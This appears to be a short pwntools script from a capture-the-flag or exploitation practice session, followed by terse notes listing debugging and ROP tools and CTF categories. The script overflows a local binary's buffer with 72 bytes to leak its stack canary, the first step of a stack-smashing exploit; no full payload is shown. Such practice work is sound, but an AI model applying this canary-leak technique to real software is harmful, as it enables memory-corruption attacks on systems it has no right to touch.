from pwn import * 


r = process('./vkl')
context.log_level = 'debug'
gdb.attach(r)
r.sendline(b'a'*72)
r.recvuntil(b'a'*72)
canary = u64(r.recv(8)) 
print(hex(canary))
r.interactive()



gdb(gef, pwndbg, peda)
ROPgadget -> assembly instruction
readelf -> 
one_gadget ->


network, kernel, system, web, crypto


